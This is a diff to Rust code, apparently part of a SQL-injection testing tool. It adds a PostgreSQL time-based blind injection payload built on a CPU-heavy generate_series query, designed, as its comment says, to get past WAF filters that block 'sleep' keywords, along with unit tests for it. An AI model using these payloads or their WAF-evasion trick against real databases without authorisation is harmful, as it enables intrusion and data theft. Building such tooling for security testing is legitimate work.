@@ -19,6 +19,17 @@ pub fn pg_time_concat(secs: u64) -> String {
     format!("'||(SELECT 1 FROM (SELECT pg_sleep({secs}))x)||' --")
 }
 
+/// Heavy-query variant without any `pg_sleep` keyword (P0-5): WAFs filtering
+/// `sleep`/`pg_sleep` pass it through, yet counting a `secs`-scaled
+/// `generate_series` burns seconds of CPU on PG 17/18. Always true
+/// (`COUNT(*) > 0`), unconditional by design — pair with the conditional
+/// `pg_sleep` variant for TRUE/FALSE confirmation.
+#[must_use]
+pub fn pg_time_heavy(secs: u64) -> String {
+    let rows = secs.saturating_mul(500_000).max(500_000);
+    format!("' AND (SELECT COUNT(*) FROM generate_series(1,{rows}))>0 --")
+}
+
 /// Canonical Postgres error-based set — legacy first (compat), then variant.
 ///
 /// - `[0]` legacy `CAST(version() AS int)` — `invalid input syntax` channel
@@ -60,5 +71,24 @@ mod tests {
         assert!(p.contains("SELECT 1 FROM (SELECT pg_sleep"), "{p}");
         assert!(p.ends_with(" --"), "{p}");
         assert!(!p.contains(';'), "{p}");
+    }
+
+    #[test]
+    fn heavy_has_no_sleep_keyword_and_scales() {
+        // P0-5: `generate_series` CPU burn passes `sleep`/`pg_sleep`
+        // keyword filters; row count scales with `secs`.
+        let p = pg_time_heavy(5);
+        assert!(p.contains("generate_series(1,2500000)"), "{p}");
+        assert!(!p.to_ascii_lowercase().contains("sleep"), "{p}");
+        assert!(p.ends_with(" --"), "{p}");
+        assert!(!p.ends_with(" -- -"), "{p}");
+        let small = pg_time_heavy(1);
+        let large = pg_time_heavy(10);
+        assert!(small.contains("generate_series(1,500000)"), "{small}");
+        assert!(large.contains("generate_series(1,5000000)"), "{large}");
+        assert!(
+            pg_time_heavy(0).contains("generate_series(1,500000)"),
+            "floor"
+        );
     }
 }
